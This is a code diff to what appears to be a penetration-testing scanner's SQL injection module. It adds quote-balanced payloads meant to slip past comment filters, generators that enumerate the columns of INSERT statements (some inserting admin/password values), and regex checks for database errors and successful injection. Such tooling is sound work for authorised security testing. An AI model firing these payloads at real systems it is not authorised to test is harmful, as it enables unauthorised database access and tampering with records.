@@ -39,6 +39,18 @@ class SQLInjectionModule(InjectionAttackModule):
             "' OR 'x'='x",
             "') OR ('x')=('x",
             
+            # Quote balancing payloads (avoid SQL comments)
+            "Wiley' OR 'a'='a",
+            "admin' OR 'b'='b",
+            "' OR '1'='1' OR 'a'='a",
+            "test' AND '1'='1' AND 'x'='x",
+            "' OR 'abc'='abc",
+            "admin' OR 'xyz'='xyz' --",
+            "' OR 'test'='test' #",
+            "value' AND 'q'='q' AND 'z'='z",
+            "1' OR 'data'='data",
+            "username' OR 'key'='key' OR 'end'='end",
+            
             # UNION-based payloads
             "' UNION SELECT NULL--",
             "' UNION SELECT NULL,NULL--",
@@ -158,29 +170,171 @@ class SQLInjectionModule(InjectionAttackModule):
         
         return False
     
+    def _generate_insert_payloads(self, base_value: str = "foo", max_params: int = 10) -> List[str]:
+        """
+        Generate payloads for INSERT statement parameter enumeration.
+        
+        This method creates payloads that progressively add more parameters
+        to discover the number of columns in an INSERT statement.
+        
+        Args:
+            base_value: Base value to use in the payload (default: "foo")
+            max_params: Maximum number of parameters to enumerate (default: 10)
+            
+        Returns:
+            List of INSERT-specific payloads with varying parameter counts
+            
+        Example payloads:
+            - foo')--
+            - foo', 1)--
+            - foo', 1, 1)--
+            - foo', 1, 1, 1)--
+            etc.
+        """
+        payloads = []
+        
+        # Basic INSERT escape attempts
+        payloads.append(f"{base_value}')--")
+        payloads.append(f"{base_value}')#")
+        payloads.append(f"{base_value}');--")
+        
+        # Parameter enumeration with NULL values
+        for i in range(1, max_params + 1):
+            params = ', '.join(['NULL'] * i)
+            payloads.append(f"{base_value}', {params})--")
+            payloads.append(f"{base_value}', {params})#")
+            
+        # Parameter enumeration with numeric values
+        for i in range(1, max_params + 1):
+            params = ', '.join(['1'] * i)
+            payloads.append(f"{base_value}', {params})--")
+            
+        # Parameter enumeration with string values
+        for i in range(1, min(6, max_params + 1)):  # Limit to 5 for string enum
+            params = ', '.join([f"'val{j}'" for j in range(i)])
+            payloads.append(f"{base_value}', {params})--")
+            
+        # Mixed parameter types (useful for detecting different column types)
+        payloads.extend([
+            f"{base_value}', 1, 'test')--",
+            f"{base_value}', 'admin', 'password')--",
+            f"{base_value}', 1, 'user', 'pass')--",
+            f"{base_value}', NULL, 1, 'test', 0)--",
+        ])
+        
+        # Quote-balanced INSERT payloads (avoid comments)
+        payloads.extend([
+            f"{base_value}' OR 'a'='a') AND ('1'='1",
+            f"{base_value}', 1) OR ('x'='x",
+            f"{base_value}', 'test') AND 'key'='key",
+        ])
+        
+        return payloads
+    
+    def _generate_quote_balanced_payloads(self, base_value: str = "") -> List[str]:
+        """
+        Generate quote-balanced payloads that avoid SQL comment syntax.
+        
+        These payloads balance quotes to achieve injection without using -- or #
+        comments, which can help bypass certain security filters.
+        
+        Args:
+            base_value: Base value to prepend to payloads
+            
+        Returns:
+            List of quote-balanced injection payloads
+        """
+        payloads = []
+        
+        # Basic quote balancing with OR conditions
+        payloads.extend([
+            f"{base_value}Wiley' OR 'a'='a",
+            f"{base_value}admin' OR 'b'='b",
+            f"{base_value}test' OR '1'='1' OR 'z'='z",
+            f"{base_value}user' AND '1'='1' AND 'x'='x",
+        ])
+        
+        # Quote balancing with different operators
+        payloads.extend([
+            f"{base_value}' OR 'key'='key",
+            f"{base_value}' AND 'val'='val' OR 'a'='a",
+            f"{base_value}' OR 'x'='x' AND '1'='1' OR 'y'='y",
+        ])
+        
+        # Nested conditions with quote balancing
+        payloads.extend([
+            f"{base_value}' OR ('a'='a' AND 'b'='b",
+            f"{base_value}' AND ('1'='1' OR '2'='2",
+        ])
+        
+        # Double-quote variants
+        payloads.extend([
+            f'{base_value}" OR "a"="a',
+            f'{base_value}" AND "1"="1" OR "x"="x',
+        ])
+        
+        return payloads
+    
     # ========================================
     # Six-Step Injection Testing Methodology
     # ========================================
     
-    def step1_supply_payloads(self, parameter_value: str) -> List[str]:
+    def step1_supply_payloads(
+        self, 
+        parameter_value: str, 
+        statement_type: str = "SELECT",
+        include_insert_enum: bool = False,
+        max_insert_params: int = 10
+    ) -> List[str]:
         """
         Step 1: Supply unexpected syntax and context-specific payloads.
         
-        Returns SQL injection payloads for various databases.
+        Returns SQL injection payloads for various databases, with optional
+        INSERT statement parameter enumeration.
+        
+        Args:
+            parameter_value: The original parameter value
+            statement_type: Type of SQL statement (SELECT, INSERT, UPDATE, DELETE)
+            include_insert_enum: Whether to include INSERT parameter enumeration
+            max_insert_params: Maximum parameters to enumerate for INSERT
+            
+        Returns:
+            List of SQL injection payloads
         """
-        return self.payloads
+        payloads = list(self.payloads)
+        
+        # Add quote-balanced payloads
+        payloads.extend(self._generate_quote_balanced_payloads(parameter_value))
+        
+        # Add INSERT-specific payloads if requested or if statement type is INSERT
+        if include_insert_enum or statement_type.upper() == "INSERT":
+            payloads.extend(self._generate_insert_payloads(
+                parameter_value if parameter_value else "foo",
+                max_insert_params
+            ))
+        
+        return payloads
     
     def step2_detect_anomalies(
         self,
         response_body: str,
         response_headers: Dict[str, str],
         response_time: float,
-        baseline_response: Optional[Tuple[str, float]] = None
+        baseline_response: Optional[Tuple[str, float]] = None,
+        payload_hint: Optional[str] = None
     ) -> Tuple[bool, List[str]]:
         """
         Step 2: Detect anomalies and error messages in responses.
         
         Look for SQL errors, timing differences, or content changes.
+        Enhanced to detect INSERT statement errors and quote-balancing effects.
+        
+        Args:
+            response_body: Response body text
+            response_headers: Response headers dict
+            response_time: Response time in seconds
+            baseline_response: Optional baseline (body, time) tuple
+            payload_hint: Optional hint about payload type (e.g., "INSERT", "QUOTE_BALANCED")
         """
         anomalies = []
         
@@ -189,6 +343,36 @@ class SQLInjectionModule(InjectionAttackModule):
             pattern = pattern_info['pattern']
             if re.search(pattern, response_body, re.IGNORECASE):
                 anomalies.append(f"sql_error: {pattern}")
+        
+        # Check for INSERT-specific error patterns
+        insert_error_patterns = [
+            r'column.*count.*doesn.*match.*value.*count',
+            r'wrong.*number.*of.*values',
+            r'INSERT.*has more.*expressions',
+            r'number.*of.*columns.*does not match',
+            r'values.*list.*target.*list',
+            r'column.*name.*or.*number.*of.*supplied.*values',
+            r'ORA-00913',  # Oracle: too many values
+            r'ORA-00947',  # Oracle: not enough values
+        ]
+        
+        for pattern in insert_error_patterns:
+            if re.search(pattern, response_body, re.IGNORECASE):
+                anomalies.append(f"insert_param_count: {pattern}")
+        
+        # Check for quote-balancing success indicators
+        # These might indicate successful query execution with balanced quotes
+        if payload_hint and 'QUOTE' in payload_hint.upper():
+            quote_success_patterns = [
+                r'successfully.*inserted',
+                r'record.*added',
+                r'user.*created',
+                r'data.*saved',
+                r'operation.*completed',
+            ]
+            for pattern in quote_success_patterns:
+                if re.search(pattern, response_body, re.IGNORECASE):
+                    anomalies.append(f"quote_balanced_success: {pattern}")
         
         # Check for timing-based detection
         if baseline_response:
@@ -199,6 +383,13 @@ class SQLInjectionModule(InjectionAttackModule):
         # Check for boolean-based indicators
         if self._check_boolean_indicators(response_body):
             anomalies.append("boolean_based: Success indicators detected")
+        
+        # Check for content length changes (useful for INSERT detection)
+        if baseline_response:
+            baseline_body, _ = baseline_response
+            len_diff = abs(len(response_body) - len(baseline_body))
+            if len_diff > 50:  # Significant difference
+                anomalies.append(f"content_change: Length difference of {len_diff} bytes")
         
         return len(anomalies) > 0, anomalies
     
@@ -243,6 +434,33 @@ class SQLInjectionModule(InjectionAttackModule):
         if error_match:
             evidence['details']['error_message'] = error_match.group(0)
         
+        # Detect INSERT statement context
+        insert_indicators = {
+            'statement_type': None,
+            'parameter_count_hint': None,
+            'injection_point': None
+        }
+        
+        for anomaly in anomalies:
+            if 'insert_param_count' in anomaly:
+                insert_indicators['statement_type'] = 'INSERT'
+                # Try to extract parameter count from error message
+                count_match = re.search(r'(\d+)\s+column', response_body, re.IGNORECASE)
+                if count_match:
+                    insert_indicators['parameter_count_hint'] = int(count_match.group(1))
+                evidence['confidence'] = max(evidence['confidence'], 0.88)
+        
+        if insert_indicators['statement_type']:
+            evidence['context_info']['insert_detection'] = insert_indicators
+        
+        # Detect quote-balanced injection success
+        quote_balanced_detected = False
+        for anomaly in anomalies:
+            if 'quote_balanced_success' in anomaly:
+                quote_balanced_detected = True
+                evidence['context_info']['injection_method'] = 'quote_balanced'
+                evidence['confidence'] = max(evidence['confidence'], 0.82)
+        
         # Calculate confidence based on anomalies
         for anomaly in anomalies:
             if 'sql_error' in anomaly:
@@ -251,8 +469,11 @@ class SQLInjectionModule(InjectionAttackModule):
                 evidence['confidence'] = max(evidence['confidence'], 0.80)
             elif 'boolean_based' in anomaly:
                 evidence['confidence'] = max(evidence['confidence'], 0.70)
+            elif 'content_change' in anomaly:
+                evidence['confidence'] = max(evidence['confidence'], 0.65)
         
         evidence['details']['anomalies'] = anomalies
+        evidence['details']['quote_balanced'] = quote_balanced_detected
         
         return evidence
     
